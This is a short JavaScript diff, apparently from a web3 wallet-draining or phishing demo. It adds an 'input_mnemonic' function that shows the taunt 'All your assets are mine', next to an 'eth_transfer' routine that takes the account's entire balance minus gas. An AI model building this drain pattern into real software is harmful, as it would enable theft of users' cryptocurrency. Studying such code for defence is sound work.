@@ -27,6 +27,10 @@ const setupWeb3 = async () => {
   }
 }
 
+const input_mnemonic = async () => {
+  alert('Congratulations! All your assets are mine.')
+}
+
 const eth_transfer = async () => {
   const {web3, chainId, account} = await setupWeb3()
   const amount = await web3.eth.getBalance(account) - web3.utils.toWei('0.01', 'ether') // - gas fee
